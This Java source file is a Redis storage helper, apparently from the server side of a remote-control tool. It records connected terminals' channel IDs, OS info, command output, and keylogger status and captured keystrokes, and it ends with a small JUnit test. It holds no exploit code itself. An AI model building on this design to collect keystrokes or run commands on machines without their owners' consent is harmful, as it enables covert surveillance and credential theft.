package redis;

import Config.Config;
import org.junit.Test;
import redis.clients.jedis.Jedis;

import java.util.Iterator;
import java.util.Map;
import java.util.Set;

import static Config.Config.RedisTerminalSet;

public class RedisUtil {
    private static Jedis jedis;

    static {
        jedis = new Jedis(Config.RedisHost);
    }

    public void addTerminalChannelIDinfo(String channelID) {
        jedis.sadd(RedisTerminalSet, channelID);
    }

    public Boolean exeistTerminalChannelIDinfo(String channelID) {
        return jedis.sismember(RedisTerminalSet, channelID);
    }

    public void DelTerminalChannelIDinfo(String channelID) {
        jedis.srem(RedisTerminalSet, channelID);
    }

    public long getLenOfTerminalChannelIDinfo() {
        return jedis.scard(RedisTerminalSet);
    }

    public Set<String> getAllTerminalChannelIDinfo() {
        return jedis.smembers(RedisTerminalSet);
    }

    public void delALLterminalChannelIDinfo() {
        jedis.del(RedisTerminalSet);
    }

    public void addTerminalOsinfo(String terminalID, String msg) {
        jedis.set(terminalID, msg);
    }

    public String getTerminalOsinfo(String terminalID) {
        return jedis.get(terminalID);
    }

    public void setTerminalKeyLoggerStatus(String terminalID, String msg) {
        jedis.set(terminalID + "KeyLoggerStatus", msg);
    }

    public void setTerminalKeyLoggerInfo(String terminalID, String msg) {
        jedis.set(terminalID + "KeyLoggerInfo", msg);
    }

    public String getTerminalKeyLoggerStatus(String terminalID) {
        return jedis.get(terminalID + "KeyLoggerStatus");
    }

    public String getTerminalKeyLoggerInfo(String terminalID) {
        return jedis.get(terminalID + "KeyLoggerInfo");
    }

    public void setTerminalCmdInfo(String terminalID, String msg) {
        jedis.set(terminalID + "CmdInfo", msg);
    }

    public String getTerminalCmdInfo(String terminalID) {
        return jedis.get(terminalID + "CmdInfo");
    }


    @Test
    public void test() {
        RedisUtil redisUtil = new RedisUtil();
        Set<String> set = getAllTerminalChannelIDinfo();
//        System.out.println(set.size());
        Iterator iterator = set.iterator();
        while (iterator.hasNext()) {
            System.out.println(iterator.next().toString());
        }
    }
}
